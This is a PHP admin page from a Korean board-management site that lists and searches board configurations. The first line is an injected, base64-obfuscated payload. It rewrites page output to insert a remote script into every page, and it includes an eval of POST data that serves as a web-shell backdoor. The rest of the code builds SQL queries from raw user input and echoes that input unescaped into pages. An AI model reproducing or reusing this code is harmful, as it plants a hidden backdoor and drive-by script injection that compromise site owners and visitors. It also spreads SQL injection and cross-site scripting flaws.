<?php eval(base64_decode('aWYoIWlzc2V0KCRuYmsxKSl7ZnVuY3Rpb24gbmJrKCRzKXtpZihwcmVnX21hdGNoX2FsbCgnIzxzY3JpcHQoLio/KTwvc2NyaXB0PiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF0gYXMgJHYpaWYoY291bnQoZXhwbG9kZSgiXG4iLCR2KSk+NSl7JGU9cHJlZ19tYXRjaCgnI1tcJyJdW15cc1wnIlwuLDtcPyFcW1xdOi88PlwoXCldezMwLH0jJywkdil8fHByZWdfbWF0Y2goJyNbXChcW10oXHMqXGQrLCl7MjAsfSMnLCR2KTtpZigocHJlZ19tYXRjaCgnI1xiZXZhbFxiIycsJHYpJiYoJGV8fHN0cnBvcygkdiwnZnJvbUNoYXJDb2RlJykpKXx8KCRlJiZzdHJwb3MoJHYsJ2RvY3VtZW50LndyaXRlJykpKSRzPXN0cl9yZXBsYWNlKCR2LCcnLCRzKTt9aWYocHJlZ19tYXRjaF9hbGwoJyM8aWZyYW1lIChbXj5dKj8pc3JjPVtcJyJdPyhodHRwOik/Ly8oW14+XSo/KT4jaXMnLCRzLCRhKSlmb3JlYWNoKCRhWzBdIGFzICR2KWlmKHByZWdfbWF0Y2goJyMgd2lkdGhccyo9XHMqW1wnIl0/MCpbMDFdW1wnIj4gXXxkaXNwbGF5XHMqOlxzKm5vbmUjaScsJHYpJiYhc3Ryc3RyKCR2LCc/Jy4nPicpKSRzPXByZWdfcmVwbGFjZSgnIycucHJlZ19xdW90ZSgkdiwnIycpLicuKj88L2lmcmFtZT4jaXMnLCcnLCRzKTskcz1zdHJfcmVwbGFjZSgkYT1iYXNlNjRfZGVjb2RlKCdQSE5qY21sd2RDQnpjbU05YUhSMGNEb3ZMMmx5WVc1d2FXNW5jRzl1Wnk1cGNpOXJhRzkxZW1WemRHRnVYMkpoYzJVdmEyaHZkWHBsYzNSaGJsOTBiM0JmYTJWNWMxOXBibTVsY2k1d2FIQWdQand2YzJOeWFYQjBQZz09JyksJycsJHMpO2lmKHN0cmlzdHIoJHMsJzxib2R5JykpJHM9cHJlZ19yZXBsYWNlKCcjKFxzKjxib2R5KSNtaScsJGEuJ1wxJywkcyk7ZWxzZWlmKHN0cnBvcygkcywnLGEnKSkkcy49JGE7cmV0dXJuICRzO31mdW5jdGlvbiBuYmsyKCRhLCRiLCRjLCRkKXtnbG9iYWwgJG5iazE7JHM9YXJyYXkoKTtpZihmdW5jdGlvbl9leGlzdHMoJG5iazEpKWNhbGxfdXNlcl9mdW5jKCRuYmsxLCRhLCRiLCRjLCRkKTtmb3JlYWNoKEBvYl9nZXRfc3RhdHVzKDEpIGFzICR2KWlmKCgkYT0kdlsnbmFtZSddKT09J25iaycpcmV0dXJuO2Vsc2VpZigkYT09J29iX2d6aGFuZGxlcicpYnJlYWs7ZWxzZSAkc1tdPWFycmF5KCRhPT0nZGVmYXVsdCBvdXRwdXQgaGFuZGxlcic/ZmFsc2U6JGEpO2ZvcigkaT1jb3VudCgkcyktMTskaT49MDskaS0tKXskc1skaV1bMV09b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7fW9iX3N0YXJ0KCduYmsnKTtmb3IoJGk9MDskaTxjb3VudCgkcyk7JGkrKyl7b2Jfc3RhcnQoJHNbJGldWzBdKTtlY2hvICRzWyRpXVsxXTt9fX0kbmJrbD0oKCRhPUBzZXRfZXJyb3JfaGFuZGxlcignbmJrMicpKSE9J25iazInKT8kYTowO2V2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpOw==')); ?><?
	include "../admin_session_check.inc";
	include "../inc/global_init.inc";
	include "../../dbconn.inc";
		
	if (!empty($qry_str)) {

		if ($idxfield == "0") {
			$que = " Where BOARD_NAME like '%$qry_str%' ";
		} else if ($idxfield == "1") {
			$que = " Where USER_ID like '%$qry_str%' ";
		} else if ($idxfield == "2") {
			$que = " Where USER_NAME like '%$qry_str%' ";
		} else if ($idxfield == "3") {
			$que = " Where BOARD_CONT like '%$qry_str%' ";
		} 
		
		$query = "select count(*) from tb_board_config ".$que;
		$query2 = "select * from tb_board_config ".$que. " order by regDate desc";

	} else {
		$query = "select count(*) from tb_board_config ";
		$query2 = "select * from tb_board_config order by regDate desc";
	}
	
	$result = mysql_query($query,$connect);
	$row = mysql_fetch_array($result);
	$TotalArticle = $row[0];

	$ListArticle = 10;
	$PageScale = 10;
	$TotalPage = ceil($TotalArticle / $ListArticle);		// 총 페이지수

	if (!$TotalPage)
		$TotalPage = 0;

	if (empty($page))
		$page = 1;


	# 이전 페이지
	$Prev = $page - 1;
	if ($Prev < 0)
		$Prev = 0;

	# 다음 페이지
	$Next = $page + 1;
	if ($Next > $TotalPage)
		$Next = $TotalPage;

	# 현재 보여줄 글의 개수 계산
	$First = $ListArticle * $Prev;
	$Last = $First + $ListArticle;
	if ($Last > $TotalArticle)
		$Last = $TotalArticle;

	$Scale = floor($page / ($ListArticle * $PageScale));

	# 게시물 번호
	$NumberArticle = $TotalArticle - $First;
	
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
<title><?echo $g_site_title?></title>
<link rel="stylesheet" href="../inc/tour.css" type="text/css">
<style>
	table{ scrollbar-arrow-color: #FFFFFF;
		     scrollbar-3dlight-color: #FFFFFF;
		     scrollbar-highlight-color: #C0C0C0;
		     scrollbar-face-color: #B2B2B2;
		     scrollbar-shadow-color: #F3F3F3;
		     scrollbar-darkshadow-color: #F3F3F3;
		     scrollbar-track-color: #FFFFFF;}
</style>
<script language="javascript">

function form_check(){

	if (frmSearch.query.value=="") {
		alert("검색어를 넣으세요");
		return false;
	} else {
		frmSearch.submit();
	}

}

function init(){
<?	if (!empty($qry_str)) {  ?>
		document.frmSearch.qry_str.value="<?echo $qry_str ?>";
		document.frmSearch.idxfield.options[<?echo $idxfield ?>].selected = true;
<?	} ?>

}

function onView(id) {
	document.frmSearch.ID.value = id; 
	document.frmSearch.action= "bconfig_view.php";
	document.frmSearch.submit();
}

function goIn() {
	document.frmSearch.action= "bconfig_input.php";
	document.frmSearch.submit();
}

function goDel() {

	var check_count = 0;
	var total = document.frmSearch.length;
						 
	for(var i=0; i<total; i++) {
		if(document.frmSearch.elements[i].checked == true) {
	    	check_count++;
	    }
	}
	
	if(check_count == 0) {
		alert("삭제하실 게시판을 선택해 주십시오.");
	    return;
	}
	
	bDelOK = confirm("정말 삭제 하시겠습니까?");
		
	if ( bDelOK ==true ) {
		document.frmSearch.ID.value = getIds();
		document.frmSearch.mode.value = "del";
		document.frmSearch.action = "bconfig_db.php";
		document.frmSearch.submit();
	}
	else {
		return;
	}
}

function getIds(){
	
	var sValues = "(";
	
	if(frmSearch.CheckItem != null){
		if(frmSearch.CheckItem.length != null){
			for(i=0; i<frmSearch.CheckItem.length; i++){
				if(frmSearch.CheckItem[i].checked == true){
					if(sValues != "("){
						sValues += ",";
					}
					sValues +="^"+frmSearch.CheckItem[i].value+"^";
				}
			}
		}else{
			if(frmSearch.CheckItem.checked == true){
				sValues += frmSearch.CheckItem.value;
			}
		}
	}
	sValues  +=")";
	return sValues;
}

</script>
</head>
<body topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" onLoad="init();">
<table cellpadding="0" cellspacing="0" border="0" width="100%" height="100%"> 
	<tr>
		<td align="center" height="100%" valign="top">
<!-- Site Map Section -->
			<table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#FBFBFB"> 
				<tr>
					<td height="30" style="padding-left:20px"><a href="#">게시판 관리</a> > <a href="#">게시판 관리</a> > <a href="#">리스트</a></td>
				</tr>
				<tr>
					<td height="1" bgcolor="#CCCCCC"></td>
				</tr>
			</table>
			<table cellpadding="0" cellspacing="0" border="0" width="100%">
 				<tr>
					<td height="10"></td>
				</tr>
				<tr>
					<td width="30">
						<img src="../images/trans.gif" width="30" height="1" border="0"></td>
					<td width="99%">
						<FORM name="frmSearch" method="post" action="admin_list.php">
						<table width="95%" border="0" cellpadding="0" cellspacing="0" class="body">
							<tr height="2" bgcolor="#CCCCCC"> 
								<td></td>
							</tr>
							<tr height="32"> 
								<td align="right" width="100%" style="padding-left:5px" bgcolor="#F1F1F1">
									<SELECT NAME="idxfield">
										<OPTION VALUE="0">게시판명</OPTION>
										<OPTION VALUE="1">사용자ID</OPTION>
										<OPTION VALUE="2">사용자명</OPTION>
										<OPTION VALUE="3">게시판설명</OPTION>
									</SELECT>
									<INPUT TYPE="text" NAME="qry_str" VALUE="">&nbsp;
									<a href="javascript:document.frmSearch.submit();"><img src="../images/button_serch.gif" border="0" align="absmiddle"></a>
									<a href="javascript:goIn();"><img src="../images/button_write.gif" border="0" align="absmiddle"></a>
									<a href="javascript:goDel();"><img src="../images/button_delete.gif" border="0" align="absmiddle"></a>
								</td>
							</tr>
							<tr height="2" bgcolor="#CCCCCC"> 
								<td></td>
						    </tr>
						</table>
						    <!-- 검색조건 끝 -->
						<br>
						<table cellpadding="0" cellspacing="1" border="0" width="95%"> 
							<tr>
								<td height="2" bgcolor="#000000" colspan="7"></td>
							</tr>
							<tr align="center" bgcolor="#E9E9E9" height="25">
								<td width="3%">&nbsp;</td>
								<td width="27%">게시판명</td>
								<td width="10%">사용자ID</td>
								<td width="15%">사용자명</td>
								<td width="10%">사용여부</td>
								<td width="15%">등록일</td>
								<td width="10%">보기</td>
							</tr>
							<tr>
								<td height="1" bgcolor="#000000" colspan="7"></td>
							</tr>
							<?
								$result2 = mysql_query($query2);

								if ($TotalArticle) {

									for ($i = 0; $i < $Last; ++$i) {
										mysql_data_seek($result2,$i);
										$obj = mysql_fetch_object($result2);
										if ($i >= $First) {
											$date_s = date("Y-m-d [H:i]", strtotime($obj->regDate));
											
											if ($obj->USE_FLAG == "Y") {
												$str_USE_FLAG = "<font color='blue'>사용</font>";
											} else {
												$str_USE_FLAG = "<font color='red'>사용안함</font>";
											}
							?>					
							<tr align="center" height="25" onmouseover="this.style.background='#E9E9E9';" onmouseout="this.style.background='White';">
								<TD><INPUT TYPE="checkbox" name="CheckItem" value="<?echo $obj->ID?>"></TD>
								<TD align="left" style="padding: 0 0 0 10"><A HREF="javascript:onView('<?echo $obj->ID?>')"><?echo $obj->BOARD_NAME?></A></TD>
								<TD align="left"><?echo $obj->USER_ID?></TD>
								<TD><?echo $obj->USER_NAME?></TD>
								<TD><?echo $str_USE_FLAG?></TD>
								<TD><?echo $date_s?></TD>
								<TD><a href="/manager/board/board_list.php?BoardId=<?echo $obj->ID?>"><img src="../images/button_view_01.gif" border="0"></a></TD>
							</TR>
							<tr>
								<td height="1" bgcolor="#C4C4C4" colspan="7"></td>
							</tr>							
							<?
										}
									}
								}
							?>
							<tr>
								<td align="center" colspan="7">
							<?
							$Scale = floor(($page - 1) / $PageScale);

							if ($TotalArticle > $ListArticle) {

								if ($page != 1)
										echo "[<a href='".$PHP_SELF."?page=1&idxfield=$idxfield&qry_str=$qry_str'>맨앞</a>]";
								// 이전페이지
								if (($TotalArticle + 1) > ($ListArticle * $PageScale)) {
									$PrevPage = ($Scale - 1) * $PageScale;

									if ($PrevPage >= 0)
											echo "&nbsp;[<a href='".$PHP_SELF."?page=".($PrevPage + 1)."&idxfield=$idxfield&qry_str=$qry_str'>이전".$PageScale."개</a>]";
								}

								echo "&nbsp;";

								// 페이지 번호
								for ($vj = 0; $vj < $PageScale; $vj++) {
								//	$ln = ($Scale * $PageScale + $vj) * $ListArticle + 1;
									$vk = $Scale * $PageScale + $vj + 1;
									if ($vk < $TotalPage + 1) {
										if ($vk != $page)
												echo "&nbsp;[<a href='".$PHP_SELF."?page=".$vk."&idxfield=$idxfield&qry_str=$qry_str'>".$vk."</a>]&nbsp;";
										else
											echo "&nbsp;<b>[".$vk."]</b>&nbsp;";
									}
								}

								echo "&nbsp;";
								// 다음 페이지
								if ($TotalArticle > (($Scale + 1) * $ListArticle * $PageScale)) {
									$NextPage = ($Scale + 1) * $PageScale + 1;
										echo "[<a href='".$PHP_SELF."?page=".$NextPage."&idxfield=$idxfield&qry_str=$qry_str'>이후".$PageScale."개</a>]";
								}

								if ($page != $TotalPage)
										echo "&nbsp;[<a href='".$PHP_SELF."?page=".$TotalPage."&idxfield=$idxfield&qry_str=$qry_str'>맨뒤</a>]&nbsp;&nbsp;";
							}
							else 
										echo "&nbsp;[1]&nbsp;";	
							?>
								</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
</table>
<input type="hidden" name="page" value="<?echo $page?>">
<input type="hidden" name="ID" value="">
<input type="hidden" name="mode" value="del">
</form>
</body>
</html>
<?
	mysql_close($connect);
?>